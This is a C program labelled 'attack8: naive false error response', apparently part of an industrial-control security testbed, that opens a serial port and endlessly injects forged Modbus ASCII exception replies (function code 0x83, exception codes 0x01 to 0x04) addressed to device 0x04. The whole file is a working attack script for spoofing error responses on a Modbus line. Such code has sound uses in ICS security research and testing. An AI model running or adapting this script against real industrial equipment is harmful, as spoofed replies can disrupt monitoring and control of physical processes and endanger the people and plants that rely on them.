//attack8: naive false error response
#define FORLINUX

#include "modbus.h"
#include "modbus_attack.h"

void device(int rtu, struct timespec req, struct timespec rem);

int main(int argc, char *argv[]){

  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];
  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;
  int cnt1, cnt2;
  int cnt;

  strcpy(inport,"/dev/ttyUSB2");
  strcpy(outport,"/dev/ttyUSB0");

   for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len);
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      }
      strncpy(outport, argv[i+1],len);
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) {
   return (port);
  }
  printf("open %s ok port = %d\n", outport, port);
  
  char *str;
  unsigned char lrc, top, bottom;

  addr = (unsigned char) 0x04;
  fc = (unsigned char) 0x83;
   while(1){
   for(cnt1=0; cnt1<25; cnt1++){
    datalen = 1;
    data[0] = 0x01;
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);
 }

   for(cnt1=0; cnt1<25; cnt1++){
    datalen = 1;
    data[0] = 0x02;
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);
    lrc = LRC(str,datalen+2);
    free(str);
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);
 }

   for(cnt1=0; cnt1<25; cnt1++){
    datalen = 1;
    data[0] = 0x03;
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);
    lrc = LRC(str,datalen+2);
    free(str);
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);
 }

  for(cnt1=0; cnt1<25; cnt1++){
    datalen = 1;
    data[0] = 0x04;
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);
    lrc = LRC(str,datalen+2);
    free(str);
    byte2ascii(lrc, &top, &bottom);
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt1);
    sleep(1);
 }
}
}
